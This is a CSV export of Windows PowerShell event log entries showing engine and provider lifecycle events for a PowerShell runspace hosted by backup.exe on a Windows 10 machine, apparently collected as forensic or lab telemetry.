+55,"Oct 25, 2022 @ 04:24:00.386",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Registry,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,296,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+56,"Oct 25, 2022 @ 04:24:00.386",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Alias,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,297,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+57,"Oct 25, 2022 @ 04:24:00.386",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Environment,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,298,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+58,"Oct 25, 2022 @ 04:24:00.386",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,FileSystem,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,299,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+59,"Oct 25, 2022 @ 04:24:00.386",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Function,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,300,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+60,"Oct 25, 2022 @ 04:24:00.386",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Variable,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,301,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+61,"Oct 25, 2022 @ 04:22:14.599",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,21,end,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=21
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=54b2ee3e-a5cb-4af4-a772-18b995229ff3
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Stopped,Available,5.1.19041.1237,0.5.0.27,-,-,54b2ee3e-a5cb-4af4-a772-18b995229ff3,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403,Classic,-,-,Info,-,-,-,PowerShell,295,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+62,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Registry,Started,-,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,286,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+63,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Alias,Started,-,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,287,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+64,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Environment,Started,-,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,288,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+65,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,FileSystem,Started,-,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,289,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+66,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Function,Started,-,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,290,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+67,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Variable,Started,-,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,291,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+68,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,13,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=13
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Certificate,Started,-,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,292,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+69,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,15,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,WSMan,Started,-,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,293,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+70,"Oct 25, 2022 @ 04:22:13.482",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,17,start,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=720d49e7-1a83-4a88-90b0-264eaf1eb018
+	HostApplication=backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=54b2ee3e-a5cb-4af4-a772-18b995229ff3
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Available,None,5.1.19041.1237,0.5.0.27,-,-,54b2ee3e-a5cb-4af4-a772-18b995229ff3,backup.exe,1,backup.exe,backup.exe,720d49e7-1a83-4a88-90b0-264eaf1eb018,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400,Classic,-,-,Info,-,-,-,PowerShell,294,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
